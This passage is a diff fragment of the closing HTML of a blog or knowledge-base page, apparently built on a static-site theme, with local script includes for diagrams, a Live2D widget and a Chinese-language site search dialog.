+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script src="/js/github-chart.js"></script><script src="/live2d-widget/autoload.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索知识库" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.4"></script></div></div></body></html>
